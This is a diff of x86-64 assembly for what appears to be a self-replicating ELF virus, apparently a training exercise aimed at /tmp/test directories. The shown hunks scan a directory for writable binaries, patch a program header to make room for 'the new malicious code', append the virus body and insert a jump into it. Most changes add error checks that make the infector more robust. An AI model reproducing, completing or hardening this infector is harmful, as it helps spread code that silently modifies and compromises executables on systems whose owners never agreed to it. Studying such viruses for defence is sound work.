@@ -82,6 +82,7 @@
 
 ; r15 + 1508                                        entry dpuente
 ; r15 + 1516	(5 bytes)							jmp instruction
+
 global _start
 
 section .text
@@ -105,6 +106,9 @@ _folder_stat:
 	mov rax, SYS_STAT
 	syscall
 
+	cmp rax, 0
+	jne _tmp_test2
+
 _is_dir:
 	lea rax, [r15 + 56]
 	mov rcx, [rax]
@@ -120,7 +124,7 @@ _diropen:
 	syscall
 
 	test rax, rax                                  ; checking open
-	js _end
+	js _tmp_test2
 
 	mov [r15 + 16], rax                            ; saving /tmp/test open fd
 
@@ -128,6 +132,9 @@ _change_to_dir:                                    ; cd to dir
 	lea rdi, [r15]
 	mov rax, SYS_CHDIR
 	syscall
+
+	cmp rax, 0
+	jne _tmp_test2
 
 _dirent_tmp_test:                                  ; getdents the directory to iterate over all the binaries
 	mov rdi, [r15 + 16]
@@ -149,6 +156,9 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		lea rsi, [r15 + 32]
 		mov rax, SYS_STAT
 		syscall
+		
+		cmp rax, 0
+		jne _continue_dirent
 
 	_check_file_flags:                             ; check if if the program can read and write over the binary
 		lea rax, [r15 + 56]
@@ -187,7 +197,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		mov rdi, rax                               ; rax contains fd
 		lea rsi, [r15 + 1300]                      ; rsi = ehdr
 		mov rdx, EHDR_SIZE			               ; ehdr.size
-		xor r10, r10                                ; read at offset 0
+		xor r10, r10                               ; read at offset 0
 		mov rax, SYS_PREAD64
 		syscall
 
@@ -234,7 +244,6 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		 	add r9, 0xc000000					   ; add enough memory to account for the new malicious code
 		 	mov [r15 + 1440], r9				   ; patch phdr.vaddr
 
-
 		_patch_segment_size:                       ; adding the length of the program to the section size as well as to section memory
 			add qword [r15 + 1456], _stop - _start + 5
 			add qword [r15 + 1464], _stop - _start + 5
@@ -246,6 +255,9 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			mov rsi, 0
 			mov rdx, SEEK_END
 			syscall
+
+			cmp rax, 0
+			jle _close_bin
  
 			mov [r15 + 1432], rax                  ; PT_LOAD starts at the end of the target bin to execute our code
 
@@ -289,6 +301,9 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			mov rsi, 0
 			mov rdx, SEEK_END
 			syscall
+
+			cmp rax, 0
+			jle _close_bin
 
 			mov rdx, [r15 + 1440]
 			add rdx, 5 							   ; JMP + 0xNNNNNNNN (5 bytes)
@@ -336,7 +351,7 @@ _close_folder:
 
 _tmp_test2:
 	;mov qword [r15 + 8], 't/'
-	mov byte r9, [r15 + 8]
+	mov r9, [r15 + 8]
 	cmp r9w, 0x2f74
 	jne _end
 	mov byte [r15 + 9], '2'
